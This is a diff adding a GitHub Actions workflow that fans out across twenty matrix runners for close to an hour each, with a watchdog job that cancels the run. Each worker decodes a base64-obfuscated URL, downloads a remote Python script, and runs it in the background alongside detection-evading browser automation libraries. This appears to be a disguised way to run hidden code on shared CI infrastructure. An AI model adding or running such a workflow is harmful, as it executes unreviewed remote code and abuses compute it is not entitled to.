@@ -1,0 +1,100 @@
+name: Nexus Grid Pipeline
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: nxs-sync-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Job 1: Watchdog Process (Terminates workflow at 59m limit)
+  # =================================================================
+  grid-watchdog:
+    name: "System Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WAIT_TIMEOUT: 3540
+    steps:
+      - name: Initialize Watchdog
+        run: |
+          echo "[WATCHDOG] Monitoring activated for Execution ID: ${{ github.run_id }}"
+          echo "[WATCHDOG] Holding countdown timer for ${WAIT_TIMEOUT} seconds."
+
+          sleep "${WAIT_TIMEOUT}"
+
+          echo "[WATCHDOG] Time limit reached. Requesting execution abort..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHDOG] Abort signal sent successfully."
+
+  # =================================================================
+  # Job 2: Worker Matrix Processing
+  # =================================================================
+  worker-nodes:
+    name: "Worker-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [
+          "A101", "B202", "C303", "D404", "E505", 
+          "F606", "G707", "H880", "I909", "J101", 
+          "K202", "L303", "M404", "N505", "O606", 
+          "P707", "Q808", "R909", "S100", "T200"
+        ]
+
+    steps:
+      # Step 1: System Preparation
+      - name: Setup System Environment
+        run: |
+          echo "[SETUP] Preparing node environment for Worker-${{ matrix.node_code }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # Step 2: Fetch Remote Script
+      - name: Fetch Executable Script
+        run: |
+          echo "[FETCH] Pulling payload from remote location..."
+          REMOTE_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_URL" -o task_runner.py
+          echo "[FETCH] Script retrieval complete."
+
+      # Step 3: Install Required Libraries
+      - name: Setup Python Dependencies
+        run: |
+          echo "[DEPS] Installing required python libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # Step 4: Run Task Execution
+      - name: Execute Main Process
+        run: |
+          echo ">> Starting process for Worker-${{ matrix.node_code }}..."
+
+          python3 task_runner.py &
+          TASK_PID=$!
+
+          echo ">> Background task running with PID: $TASK_PID. Timer set for 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo ">> Target runtime reached. Stopping background process..."
+            kill -9 "$TASK_PID"
+            echo ">> Process terminated."
+          else
+            echo ">> Process finished prior to timer expiration."
+          fi
